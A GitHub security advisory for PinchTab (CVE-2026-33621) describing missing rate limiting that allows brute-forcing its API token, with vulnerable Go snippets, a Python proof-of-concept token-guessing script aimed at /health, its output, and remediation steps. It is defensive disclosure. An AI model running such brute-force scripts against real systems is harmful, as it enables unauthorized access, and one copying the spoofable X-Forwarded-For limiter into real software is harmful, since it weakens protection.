# [M] PinchTab: Unapplied Rate Limiting Middleware Allows Unbounded Brute-Force of API Token

## Summary
Severity: Medium
Advisory: GHSA-j65m-hv65-r264
CVE: CVE-2026-33621
CWE: CWE-290, CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-03-24
Source: https://github.com/advisories/GHSA-j65m-hv65-r264
Type: github-advisory

## Affected
- Go: `github.com/pinchtab/pinchtab` — affected >=0.7.7 <0.8.5

## Details
### Summary
PinchTab `v0.7.7` through `v0.8.4` contain incomplete request-throttling protections for auth-checkable endpoints. In `v0.7.7` through `v0.8.3`, a fully implemented `RateLimitMiddleware` existed in `internal/handlers/middleware.go` but was not inserted into the production HTTP handler chain, so requests were not subject to the intended per-IP throttle.

In the same pre-`v0.8.4` range, the original limiter also keyed clients using `X-Forwarded-For`, which would have allowed client-controlled header spoofing if the middleware had been enabled. `v0.8.4` addressed those two issues by wiring the limiter into the live handler chain and switching the key to the immediate peer IP, but it still exempted `/health` and `/metrics` from rate limiting even though `/health` remained an auth-checkable endpoint when a token was configured.

This issue weakens defense in depth for deployments where an attacker can reach the API, especially if a weak human-chosen token is used. It is not a direct authentication bypass or token disclosure issue by itself. PinchTab is documented as local-first by default and uses `127.0.0.1` plus a generated random token in the recommended setup.

PinchTab's default deployment model is a local-first, user-controlled environment between the user and their agents; wider exposure is an intentional operator choice. This lowers practical risk in the default configuration, even though it does not by itself change the intrinsic base characteristics of the bug.

This was fully addressed in `v0.8.5` by applying `RateLimitMiddleware` in the production handler chain, deriving the client address from the immediate peer IP instead of trusting forwarded headers by default, and removing the `/health` and `/metrics` exemption so auth-checkable endpoints are throttled as well.

### Details
**Issue 1 — Middleware never applied in `v0.7.7` through `v0.8.3`:**
The production server wrapped the HTTP mux without `RateLimitMiddleware`:

```
// internal/server/server.go — v0.8.3
handlers.LoggingMiddleware(
    handlers.CorsMiddleware(
        handlers.AuthMiddleware(cfg, mux),
        // RateLimitMiddleware is not present here in v0.8.3
    ),
)
```

The function exists and is fully implemented:

```
// internal/handlers/middleware.go — v0.8.3
func RateLimitMiddleware(next http.Handler) http.Handler {
    startRateLimiterJanitor(rateLimitWindow, evictionInterval)
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // ... 120 req / 10s logic ...
    })
}
```

Because `RateLimitMiddleware` was never referenced from the production handler chain in `v0.7.7` through `v0.8.3`, the intended request throttling was inactive in those releases.

**Issue 2 — `X-Forwarded-For` trust in the original limiter (`v0.7.7` through `v0.8.3`):**
Even if the middleware had been applied, the original IP identification was bypassable:

```
// internal/handlers/middleware.go — v0.8.3
host, _, _ := net.SplitHostPort(r.RemoteAddr)  // real IP
if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
    // No validation that request came from a trusted proxy
    // Client can set this header to any value
    host = strings.TrimSpace(strings.Split(xff, ",")[0])
}
// host is now client-influenced — rate limit key is spoofable
```

In `v0.7.7` through `v0.8.3`, if the limiter had been enabled, a client could have influenced the rate-limit key through `X-Forwarded-For`. This made the original limiter unsuitable without an explicit trusted-proxy model.

**Issue 3 — `/health` and `/metrics` remained exempt through `v0.8.4`:**
`v0.8.4` wired the limiter into production and switched to the immediate peer IP, but it still bypassed throttling for `/health` and `/metrics`:

```
// internal/handlers/middleware.go — v0.8.4
func RateLimitMiddleware(next http.Handler) http.Handler {
    startRateLimiterJanitor(rateLimitWindow, evictionInterval)
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        p := strings.TrimSpace(r.URL.Path)
        if p == "/health" || p == "/metrics" || strings.HasPrefix(p, "/health/") || strings.HasPrefix(p, "/metrics/") {
            next.ServeHTTP(w, r)
            return
        }
        host := authn.ClientIP(r)
        // ...
    })
}
```

That left `GET /health` unthrottled even though it remained an auth-checkable endpoint when a server token was configured, so online guessing against that route still saw no rate-limit response through `v0.8.4`.

### PoC
This PoC assumes the server is reachable by the attacker and that the configured API token is weak and guessable, for example `password`.

**PoC Code**
```
#!/usr/bin/env python3
# brute_force_poc.py — demonstrates unthrottled token guessing on /health
import urllib.request, urllib.error, time, sys

TARGET   = "http://localhost:9867/health"
WORDLIST = [f"wrong-{i:03d}" for i in range(150)] + ["password"]
counts = {}

print(f"[*] Brute-forcing {TARGET} — no rate limit protection")
start = time.time()
for token in WORDLIST:
    req = urllib.request.Request(TARGET)
    req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            print(f"[+] FOUND: token={token!r}  HTTP={r.status}")
            counts[r.status] = counts.get(r.status, 0) + 1
            sys.exit(0)
    except urllib.error.HTTPError as e:
        print(f"[-] token={token!r}  HTTP={e.code}")
        counts[e.code] = counts.get(e.code, 0) + 1

elapsed = time.time() - start
print(f"[*] {len(WORDLIST)} attempts in {elapsed:.2f}s — "
      f"{len(WORDLIST)/elapsed:.0f} req/s  (no 429 received)")
print(f"[*] status counts: {counts}")
```

After run
```
python3 ratelimit.py
[*] Brute-forcing http://localhost:9867/health — no rate limit protection
[-] token='wrong-000'  HTTP=401
...
[-] token='wrong-149'  HTTP=401
[+] FOUND: token='password'  HTTP=200
[*] 151 attempts in 0.84s — 180 req/s  (no 429 received)
[*] status counts: {401: 150, 200: 1}
```

**Observation:**
1. In `v0.7.7` through `v0.8.3`, rapid requests do not return HTTP 429 because `RateLimitMiddleware` is not active in production.
2. In `v0.8.4`, the same `/health` PoC still does not return HTTP 429 because `/health` is explicitly exempted from rate limiting.
3. The PoC succeeds only when the configured token is weak and appears in the tested candidates.
4. The original `X-Forwarded-For` behavior in `v0.7.7` through `v0.8.3` shows that the first limiter design would not have been safe to rely on behind untrusted clients.
5. This PoC does not demonstrate token disclosure or authentication bypass independent of token guessability.

### Impact
1. Reduced resistance to online guessing of weak or reused API tokens in deployments where an attacker can reach the API.
2. Loss of the intended per-IP throttling for burst requests against protected endpoints in `v0.7.7` through `v0.8.3`, and against `/health` in `v0.8.4`.
3. Higher abuse potential for intentionally exposed deployments than intended by the middleware design.
4. This issue does not by itself disclose the token, bypass authentication, or make all deployments equally affected. Installations using the default local-first posture and generated high-entropy tokens have substantially lower practical risk.

### Suggested Remediation
1. Apply `RateLimitMiddleware` in the production handler chain for authenticated routes.
2. Derive the rate-limit key from the immediate peer IP by default instead of trusting client-supplied forwarded headers.
3. Do not exempt auth-checkable endpoints such as `/health` and `/metrics` from rate limiting.
4. Consider an additional auth-failure throttle so repeated invalid token attempts are constrained even when endpoint-level behavior changes in the future.

**Screenshot capture**
<img width="553" height="105" alt="ภาพถ่ายหน้าจอ 2569-03-18 เวลา 13 03 01" src="https://github.com/user-attachments/assets/ab5cd7af-5a67-40ae-aae3-1f4737afd32e" />

## References
- https://github.com/pinchtab/pinchtab/security/advisories/GHSA-j65m-hv65-r264
- https://nvd.nist.gov/vuln/detail/CVE-2026-33621
- https://github.com/pinchtab/pinchtab/commit/c619c43a4f29d1d1a481e859c193baf78e0d648b
- https://github.com/pinchtab/pinchtab
- https://github.com/pinchtab/pinchtab/releases/tag/v0.8.4
